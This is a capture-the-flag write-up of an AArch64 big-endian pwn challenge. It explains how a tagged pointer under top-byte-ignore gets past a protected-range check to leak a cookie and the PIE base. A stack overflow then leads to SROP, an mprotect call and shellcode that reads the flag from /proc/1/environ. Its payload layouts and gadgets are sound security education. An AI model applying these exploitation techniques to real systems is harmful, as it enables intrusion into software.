# Dead Reckoning

| Field | Value |
| --- | --- |
| CTF | z0d1akCTF 2026 Qualifiers |
| Category | Binary Exploitation |
| Author | ant1v3n0m |
| Points | 251 |
| Solves at time of solving | 19 |
| Flag | `zdk{ThE_70P_8YTe_CHARtEd_A_RoU7e_B31OW_th3_suRFACe}` |

> Bring the recovery beacon home.

## Executive Summary

`dead_reckoning` is a stripped, static PIE AArch64 big-endian binary served
through a TLS wrapper. The program exposes a small repair console around a
freshly mapped 0x2000-byte "salvage arena". A protected control block inside
that arena stores a custom stack cookie, a PIE code pointer, and the number of
bytes that the survey command is allowed to leak.

The exploit uses two primitives:

1. The eight-byte repair command validates the destination after clearing the
   pointer's top byte, but performs the final store through the original
   pointer. Under AArch64 top-byte-ignore, a tagged pointer can therefore write
   into the protected control block. Overwriting the survey length leaks the
   custom cookie and PIE base.
2. The route importer reads up to 0x600 bytes into a 0x100-byte stack frame.
   Preserving the leaked custom cookie gives control of saved `x30`. Returning
   to the embedded `rt_sigreturn` gadget restores a crafted AArch64 signal
   frame, makes the arena executable with `mprotect`, and returns into
   open/read/write shellcode.

Normal `/flag` paths were absent. A directory listing showed the challenge
running as `/dead_reckoning` under `qemu-aarch64_be-static`, launched by a
platform wrapper named `/server`. Reading `/proc/1/environ` revealed the
wrapper's `FLAG=` environment variable.

## Repository Contents

| Path | Purpose | SHA-256 |
| --- | --- | --- |
| [`challenge/pwn_dead-reckoning.tar.gz`](challenge/pwn_dead-reckoning.tar.gz) | Original challenge handout | `0952e6f187c8084b0f4896243c09d922b4cfb597e07a19220bc2f104d083154f` |
| [`challenge/dead_reckoning`](challenge/dead_reckoning) | Extracted challenge executable | `223b3a4dbc0bece51e992f134b5076e5d49d9baf990c62247e5c09f4f7313999` |
| [`solve.py`](solve.py) | Dependency-free remote exploit | `008d731efc9d4d16418924cea8d5d380b0be1dcae5e8fcdd8c0335433e85163f` |
| [`artifacts/offsets.txt`](artifacts/offsets.txt) | Static offsets, arena layout, and SROP frame notes | `8113b0053a450ed772870500c2b55bcbf1143ec06d481f0eccbd61d34f8be893` |
| [`artifacts/root-getdents.txt`](artifacts/root-getdents.txt) | Root directory listing recovered with shellcode | `1a0ad94bcf64838a0c5a139c7037df8e37dd910e7f885519d2cb1b697c78e4dc` |
| [`artifacts/remote-run.txt`](artifacts/remote-run.txt) | Successful remote transcript | `16b2cb072acc97ed67ce8bb4e751364d956451c9097bac9c7ac1259ebed4541a` |

## 1. Initial Triage

The handout contains one executable:

```console
$ tar -tzf pwn_dead-reckoning.tar.gz
dead_reckoning
```

`file` immediately gives the unusual part of the challenge:

```console
$ file dead_reckoning
dead_reckoning: ELF 64-bit MSB pie executable, ARM aarch64,
                static-pie linked, stripped
```

`rabin2 -I` reports:

| Property | Value |
| --- | --- |
| Architecture | AArch64 |
| Endianness | Big-endian |
| PIE | Enabled |
| NX | Enabled |
| Linking | Static |
| Symbols | Stripped |

The binary is tiny. The useful strings are all menu text and error messages:

```text
=== DEAD RECKONING REPAIR CONSOLE ===
salvage arena :
1. apply eight-byte repair
2. survey wreck
3. import captain's route
4. abandon wreck
destination:
eight-byte patch:
route length:
route bytes:
```

This points to a small hand-written syscall program rather than a libc-heavy
heap challenge.

## 2. Main Initialization

The program starts by closing file descriptors 3 through 63, then maps a
0x2000-byte read/write anonymous arena with syscall 222 (`mmap`):

```text
0x42c  x1 = 0x2000
0x434  x2 = 3          ; PROT_READ | PROT_WRITE
0x438  x3 = 0x22       ; MAP_PRIVATE | MAP_ANONYMOUS
0x440  x8 = 222
0x444  svc #0
```

The arena base is printed to the user:

```text
salvage arena : 0x0000005502a23000
```

The binary also creates a custom eight-byte cookie with `getrandom`. If that
fails, it falls back to a deterministic value derived from the arena address.
The interesting fields are copied into a control block at `arena+0x1800`:

```text
arena+0x18c0 = custom cookie
arena+0x18c8 = pie+0x2e0
arena+0x18d0 = survey length, initially 0x30
```

That block is meant to be protected from the menu's write primitive.

## 3. The Eight-Byte Repair Primitive

Menu option 1 asks for a destination and an eight-byte value. The destination
validation has two parts:

```asm
0x670  ldr x1, [sp,#0x68]             ; user destination
0x674  ldr x0, [x24]                  ; arena base
0x678  and x2, x1, #0xffffffffffffff  ; clear top byte
0x67c  cmp x0, x2                     ; lower bound check uses masked ptr
...
0x68c  cmp x2, x3                     ; upper bound check uses masked ptr
```

The bounds check intentionally accepts only addresses inside the arena. The
protected-control check, however, compares the original unmasked pointer:

```asm
0x694  x2 = arena + 0x18d8
0x69c  cmp x1, x2
0x6a0  b.hs 0x6b8
...
0x6b8  str x0, [x1]                   ; final store uses unmasked ptr
```

On AArch64 Linux, top-byte-ignore means the CPU ignores bits 63 through 56 for
ordinary userspace address translation. Therefore:

```text
tagged = (0xff << 56) | (arena + 0x18d0)
```

passes the unmasked protected-range comparison as a huge pointer, while the
actual store lands at `arena+0x18d0`. Setting that qword to `0xd8` expands the
survey leak far enough to include the protected control block.

## 4. Leaking the Cookie and PIE Base

Menu option 2 starts printing bytes at `arena+0x1800` and stops after the
length stored at `arena+0x18d0`. After the tagged repair, a survey leak contains
the sensitive fields:

```text
relative to arena+0x1800

+0x0c0  custom cookie
+0x0c8  pointer initialized to pie+0x2e0
+0x0d0  survey length
```

Example leak values:

```text
arena  = 0x5502a23000
cookie = 0x8a683a658ae625d7
ptr    = 0x55000002e0
pie    = ptr - 0x2e0 = 0x5500000000
```

At this point both random protections used by the binary are defeated.

## 5. Route Importer Overflow

Menu option 3 accepts a route length from 1 through 0x600, then calls the route
importer at `0x83c`. The importer reserves only 0x100 stack bytes but reads the
full attacker-supplied length into the beginning of that frame.

The relevant layout is:

```text
sp+0x000  route buffer
sp+0x0c0  saved custom cookie
sp+0x0c8  saved x29
sp+0x0d0  saved x30
```

The function verifies only the custom cookie before returning:

```asm
0x894  ldr x10, [sp,#0xc0]
0x898  ldr x11, [pie+0x20008]
0x89c  cmp x10, x11
0x8a0  b.ne exit
0x8a4  ldp x29, x30, [sp,#0xc8]
0x8a8  add sp, sp, #0x100
0x8ac  ret
```

The exploit preserves the leaked cookie, overwrites saved `x30`, and places the
fake signal frame at the post-epilogue stack location:

```text
"A" * 0xc0
cookie
fake_x29
pie+0x818        ; mov x8, #139; svc #0; brk
padding to 0x100
fake rt_sigframe
```

## 6. AArch64 Big-Endian SROP

The binary contains two perfect gadgets:

```asm
0x818  mov x8, #139      ; rt_sigreturn
0x81c  svc #0
0x820  brk #0

0x824  svc #0
0x828  ret
```

The signal frame restores:

```text
x0 = arena
x1 = 0x2000
x2 = 7                  ; PROT_READ | PROT_WRITE | PROT_EXEC
x8 = 226                ; mprotect
pc = pie+0x824          ; svc #0; ret
x30 = arena+0x400       ; shellcode after mprotect returns
```

The only subtle part is the signal-frame trailer. The target is AArch64 BE8:
instruction words are still encoded little-endian, but data is loaded and
stored big-endian. For the kernel to accept the fake frame, the FPSIMD context
header must be written as two big-endian 32-bit fields:

```text
0x46508001  0x00000210
```

With that correction, a marker shellcode confirmed code execution from the
arena:

```text
CODE_OK
```

## 7. Final Shellcode and Flag Location

The final shellcode is a minimal syscall-only reader:

```asm
openat(AT_FDCWD, path, O_RDONLY, 0)
read(fd, arena+0x800, 0x100)
write(1, arena+0x800, 0x100)
exit(0)
```

Reading `/flag` and `/flag.txt` returned empty buffers. A `getdents64("/")`
payload revealed the actual runtime layout:

```text
.
..
server
dev
proc
sys
run
etc
dead_reckoning
qemu-aarch64_be-static
```

`/server` is an x86-64 ELF launcher, and the challenge binary runs through
`qemu-aarch64_be-static`. The flag was exposed in the wrapper process
environment, so the final target was:

```text
/proc/1/environ
```

The recovered environment contained:

```text
FLAG=zdk{ThE_70P_8YTe_CHARtEd_A_RoU7e_B31OW_th3_suRFACe}
```

## 8. Reproduction

Run the solver against a live instance:

```console
$ python3 solve.py dead-reckoning-4737af39fa0a.chals.z0d1ak.org 1337
zdk{ThE_70P_8YTe_CHARtEd_A_RoU7e_B31OW_th3_suRFACe}
```

The script uses only Python's standard library. If an instance stops returning
the initial console banner after crash testing, spawn a fresh instance and pass
the new hostname as the first argument.

## 9. Takeaways

The challenge is built around an architecture-specific pointer rule. The repair
handler appears to protect the navigation-control block, but validating a
masked pointer and storing through the unmasked pointer is fatal on AArch64.
Once the protected survey length is overwritten, the custom canary becomes a
leak rather than a defense, and the included `rt_sigreturn` gadget gives a
compact route to full syscall control.
